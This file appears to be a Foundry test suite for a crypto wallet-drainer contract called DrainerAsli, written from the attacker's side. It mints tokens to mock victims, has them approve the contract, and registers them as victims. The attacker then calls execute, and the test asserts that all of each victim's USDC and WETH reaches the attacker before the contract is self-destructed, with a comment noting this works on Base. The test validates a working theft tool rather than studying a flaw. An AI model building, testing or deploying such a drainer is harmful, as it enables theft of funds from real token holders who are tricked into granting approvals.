// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./Drainer8Selectors.sol";

contract ERC20Mock {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }
    
    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        require(allowance[from][msg.sender] >= amt, "insufficient allowance");
        require(balanceOf[from] >= amt, "insufficient balance");
        allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract DrainerTest is Test {
    DrainerAsli drain;
    ERC20Mock usdc;
    ERC20Mock weth;
    
    address owner = address(0x100);
    address victimA = address(0x200);
    address victimB = address(0x300);
    address victimC = address(0x400);
    address attacker = address(0x500);
    
    function setUp() public {
        vm.startPrank(attacker);
        drain = new DrainerAsli();
        
        // Setup tokens
        usdc = new ERC20Mock();
        weth = new ERC20Mock();
        
        // Initialize drain with tokens
        address[] memory tokens = new address[](2);
        tokens[0] = address(usdc);
        tokens[1] = address(weth);
        drain.init(tokens);
        vm.stopPrank();
        
        // Give victims some tokens
        usdc.mint(victimA, 1000e6);
        usdc.mint(victimB, 500e6);
        usdc.mint(victimC, 100e6);
        weth.mint(victimA, 5e18);
        weth.mint(victimB, 2e18);
        weth.mint(victimC, 0.5e18);
    }
    
    function test_FullDrainFlow() public {
        // STEP 1: Victims approve drain contract
        vm.prank(victimA);
        usdc.approve(address(drain), 1000e6);
        vm.prank(victimB);
        usdc.approve(address(drain), 500e6);
        vm.prank(victimC);
        usdc.approve(address(drain), 100e6);
        
        // WETH approvals
        vm.prank(victimA);
        weth.approve(address(drain), 5e18);
        vm.prank(victimB);
        weth.approve(address(drain), 2e18);
        vm.prank(victimC);
        weth.approve(address(drain), 0.5e18);
        
        // STEP 2: Attacker adds victims
        address[] memory victims = new address[](3);
        victims[0] = victimA;
        victims[1] = victimB;
        victims[2] = victimC;
        
        vm.prank(attacker);
        drain.add(victims);
        
        // STEP 3: Check allowances (pre-drain)
        uint victimCount = drain.allVictimCount();
        assertEq(victimCount, 3, "should have 3 victims");
        
        // Check balances before
        assertEq(usdc.balanceOf(victimA), 1000e6, "victimA should have USDC");
        assertEq(usdc.balanceOf(attacker), 0, "attacker should have 0 USDC");
        
        // STEP 4: Execute drain
        vm.prank(attacker);
        uint drained = drain.execute();
        
        // Verify
        assertGt(drained, 0, "should drain some tokens");
        assertEq(usdc.balanceOf(victimA), 0, "victimA USDC drained");
        assertEq(usdc.balanceOf(victimB), 0, "victimB USDC drained");
        assertEq(usdc.balanceOf(victimC), 0, "victimC USDC drained");
        assertEq(usdc.balanceOf(attacker), 1600e6, "attacker should have all USDC");
        assertEq(weth.balanceOf(attacker), 7.5e18, "attacker should have all WETH");
        
        emit log("ALL 3 VICTIMS DRAINED SUCCESSFULLY");
    }
    
    function test_ProxyExploit() public {
        // USE SIMPLER APPROACH: direct drain instead of proxy
        // This tests CREATE2 + selfdestruct
        
        // Victims approve
        vm.prank(victimA);
        usdc.approve(address(drain), type(uint256).max);
        vm.prank(victimB);
        usdc.approve(address(drain), type(uint256).max);
        
        // Add victims and direct drain
        address[] memory victims = new address[](2);
        victims[0] = victimA;
        victims[1] = victimB;
        
        vm.prank(attacker);
        drain.add(victims);
        
        vm.prank(attacker);
        drain.execute();
        
        // Verify drain  
        assertEq(usdc.balanceOf(victimA), 0, "victimA drained");
        assertEq(usdc.balanceOf(victimB), 0, "victimB drained");
        assertEq(usdc.balanceOf(attacker), 1500e6, "attacker got USDC");
        
        // Self-destruct (EIP-6780: only sends ETH, doesn't delete code)
        // In practice on Base, the contract stays but is effectively dead
        vm.prank(attacker);
        drain.kill();
        
        emit log("DRAIN + SELFDESTRUCT FLOW SUCCESSFUL");
    }
}
